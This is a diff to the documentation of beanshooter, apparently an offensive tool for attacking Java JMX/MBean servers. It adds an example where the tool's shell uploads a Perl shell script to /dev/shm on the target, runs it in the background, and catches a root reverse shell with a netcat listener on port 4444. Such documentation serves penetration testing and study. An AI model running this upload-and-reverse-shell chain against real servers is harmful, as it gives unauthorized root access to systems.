@@ -234,7 +234,8 @@ While this is also possible for the *tonka-bean*, *beanshooter* supports actions
 [+] Servers answer is: uid=0(root) gid=0(root) groups=0(root)
 ```
 
-You can also use the *shell* action, to launch multiple commands as in a command shell:
+You can also use the *shell* action, to launch multiple commands as in a (pseudo) command shell. The shell also
+contains wrappers around the ``upload``, ``download`` and ``executeBackground`` actions of *beanshooter*:
 
 ```console
 [qtc@kali ~]$ beanshooter --ssl 172.17.0.2 9010 shell
@@ -247,7 +248,20 @@ You can also use the *shell* action, to launch multiple commands as in a command
 
 $ id
 uid=0(root) gid=0(root) groups=0(root)
+$ !upload ~/www/shell.pl /dev/shm/s.pl 
+[+] File upload finished. 170 bytes were written to /dev/shm/s.pl
+$ !background perl /dev/shm/s.pl
+Command is executed in the background.
 $ exit
+
+[qtc@kali ~]$ nc -vlp 4444
+Ncat: Version 7.80 ( https://nmap.org/ncat )
+Ncat: Listening on :::4444
+Ncat: Listening on 0.0.0.0:4444
+Ncat: Connection from 172.17.0.2.
+Ncat: Connection from 172.17.0.2:37522.
+id
+uid=0(root) gid=0(root) groups=0(root)
 ```
 
 Once you are done with your *MBean*, you should make sure to undeploy all changes that you have made to the server.
